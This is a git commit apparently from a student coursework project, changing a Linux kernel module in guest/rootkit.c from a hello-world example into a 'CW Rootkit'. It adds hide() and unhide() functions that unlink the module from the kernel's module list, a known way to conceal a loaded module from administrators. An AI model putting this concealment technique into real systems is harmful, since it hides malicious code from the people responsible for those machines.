6da660b3f96032794728f8b61d322f7e93ed3e23
Keywarn <charliehasalamb@icloud.com>
2020-11-24 11:53:40 +0000

    Hide and unhide

--- guest/rootkit.c
+++ guest/rootkit.c
@@ -1,19 +1,34 @@
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
+#include <linux/list.h>
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Thomas");
-MODULE_DESCRIPTION("Hello Module");
+MODULE_AUTHOR("Finn_Adam_Charlie");
+MODULE_DESCRIPTION("CW Rootkit");
 MODULE_VERSION("0.0.1");
 
+struct list_head *module_list;
+
 static int __init lkm_example_init(void) {
- printk(KERN_INFO "Hello, World!\n");
- return 0;
+
+    printk(KERN_INFO "Hello, World!\n");
+    return 0;
 }
 
 static void __exit lkm_example_exit(void) {
- printk(KERN_INFO "Goodbye, World!\n");
+    printk(KERN_INFO "Goodbye, World!\n");
+}
+
+void hide(void)
+{
+    module_list = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+}
+
+void unhide(void)
+{
+    list_add(&THIS_MODULE->list, module_list);
 }
 
 module_init(lkm_example_init);
